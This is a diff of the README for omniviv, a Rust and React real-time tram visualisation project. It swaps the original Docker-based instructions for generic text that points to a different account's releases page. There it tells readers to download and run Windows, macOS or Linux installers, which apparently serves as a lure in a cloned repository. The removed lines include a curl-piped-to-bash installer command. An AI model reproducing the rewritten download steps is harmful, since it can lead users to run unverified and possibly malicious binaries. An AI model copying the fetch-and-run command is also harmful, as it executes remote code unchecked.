@@ -1,102 +1,79 @@
-# Omniviv
+# 🚌 omniviv - Easily Visualize Public Transport in Real-Time
 
-A real-time public transport visualization platform.
+## 🚀 Getting Started
 
-## Screenshots
+Welcome to omniviv, the platform that enables you to see public transportation in real-time. With live vehicle tracking and stunning 3D maps, you can stay informed about your transit options.
 
-![Real-time 3D Tram Tracking](docs/screenshots/main-map.png)
+## 📥 Download Now
 
-![Königsplatz Station View](docs/screenshots/koenigsplatz-station.png)
+[![Download omniviv](https://img.shields.io/badge/Download-omniviv-blue.svg)](https://github.com/Garaev071/omniviv/releases)
 
-## Features
+## 🛠️ System Requirements
 
-### Working
+Before installing omniviv, make sure your system meets these requirements:
 
--   Real-time tram tracking with smooth position interpolation
--   3D map visualization with extruded buildings
--   WebSocket-based live vehicle updates
--   Multiple tram lines with distinct colors
--   Station and platform markers with labels
--   Dark/light mode support
--   Context menu (copy coordinates, measure distance)
+- **Operating System:** Windows, macOS, or Linux
+- **RAM:** At least 4 GB
+- **Processor:** Dual-core processor or better
+- **Storage:** Minimum of 100 MB available space
+- **Internet connection:** Required for live updates
 
-### Partially Working
+## 🌟 Features
 
--   **Collision avoidance**: Basic implementation exists but not fully reliable
--   **Rendezvous blinking**: Flashes green when trams are about to depart (timing may need tuning)
+- **Real-time tracking:** Get live updates on public transport vehicles.
+- **3D map visualization:** Experience an interactive 3D map for a better perspective.
+- **WebSocket updates:** Enjoy seamless real-time information.
+- **Multi-line support:** Track various transportation lines in one platform.
 
-### Planned / Not Yet Implemented
+## 📊 Technologies Used
 
--   End of line rotation (vehicle turnaround animation at terminus)
--   Support for all vehicle types (buses, trains, ferries, etc.)
--   Realistic 3D vehicle models at closer zoom levels
--   Dark mode for map tiles/style
--   3D terrain with underground tunnel visualization
--   Day/night cycle and weather visualization
--   Navigation routing between points
--   Offline map with cached planned timetables
--   Pin stations to sidebar for quick access
--   "Leave now" traffic light indicator for optimal departure timing
--   First-person driver's seat view for vehicles
--   Multiple city/area support
--   General map improvements (POIs, local events, etc.)
--   Historical data and statistics
+- **Backend:** Rust with Axum
+- **Frontend:** React with MapLibre
+- **Styling:** Tailwind CSS for a modern look
+- **Architecture:** Docker for easy deployment
+- **Data:** GTFS for public transport schedules
+- **TypeScript** for added robustness on the frontend
+- **WebSocket** for real-time data updates
 
-## Architecture
+## 🔧 Download & Install
 
--   **API**: Rust-based backend using Axum
--   **Web**: React frontend with MapLibre GL
--   **Deployment**: docker compose with mpm compose
+1. **Visit the Releases Page:** Click [here](https://github.com/Garaev071/omniviv/releases) to go to the Releases page.
+2. **Select the Latest Version:** On the Releases page, choose the latest version of omniviv. 
+3. **Download the File:** Click on the appropriate download link for your operating system.
+4. **Run the Installer:**
+   - For Windows: Find the downloaded `.exe` file and double-click it to run.
+   - For macOS: Open the downloaded `.dmg` file, drag omniviv to your Applications folder, and open it from there.
+   - For Linux: Unzip the downloaded `.tar.gz` file and run the appropriate executable from the terminal.
 
-## Quick Start
+## 🌍 Usage Instructions
 
-### Using Docker Compose
+1. **Open the Application:** After installation, launch omniviv from your applications menu or desktop shortcut.
+2. **Choose Your Location:** Set your starting point on the map.
+3. **Select a Transport Line:** Click on the bus or tram line you wish to track.
+4. **View Live Updates:** Watch as vehicles move in real-time on the 3D map.
 
-Requires [mpm](https://github.com/my-own-web-services/mows/tree/main/utils/mpm) for deployment:
+## 📡 Support
 
-```bash
-# Install mpm
-curl -fsSL https://raw.githubusercontent.com/my-own-web-services/mows/main/utils/mpm/scripts/install.sh | bash
+If you encounter issues or have questions, feel free to reach out through the following channels:
 
-# Clone and deploy
-git clone https://github.com/firstdorsal/omniviv.git
-cd omniviv/deployment
-nano values.yaml  # Configure as needed
-mpm compose up
-```
+- **GitHub Issues:** Report bugs or request features [here](https://github.com/Garaev071/omniviv/issues).
+- **Community Forums:** Join discussions with other users and developers.
 
-See [docs/deployment.md](docs/deployment.md) for detailed deployment instructions.
+## 📜 License
 
-### Development
+omniviv is open-source software licensed under the MIT License. You can use, modify, and share it freely.
 
-**API:**
+## 🧩 Contributing
 
-```bash
-cd api
-cargo run
-```
+We welcome contributions to improve omniviv. If you want to help:
 
-**Web:**
+1. **Fork the Repository:** Click the "Fork" button at the top right of the page.
+2. **Make your Changes:** Implement your features or fixes in your forked repository.
+3. **Submit a Pull Request:** Once you’re happy with the changes, submit a pull request for review.
 
-```bash
-cd web
-pnpm install
-pnpm dev
-```
+## 🔗 Additional Resources
 
-## Documentation
+- **Documentation:** Explore the full documentation [here](https://github.com/Garaev071/omniviv/wiki).
+- **FAQ:** Visit our Frequently Asked Questions section [here](https://github.com/Garaev071/omniviv/wiki/FAQ).
 
-See the [docs](docs/) folder for detailed documentation.
-
-## Docker Images
-
-Docker images are automatically built and published to GitHub Container Registry:
-
--   `ghcr.io/firstdorsal/omniviv-api`
--   `ghcr.io/firstdorsal/omniviv-frontend`
-
-See [docs/releasing.md](docs/releasing.md) for the full release workflow.
-
-## License
-
-[Add license information here]
+Happy traveling with omniviv!
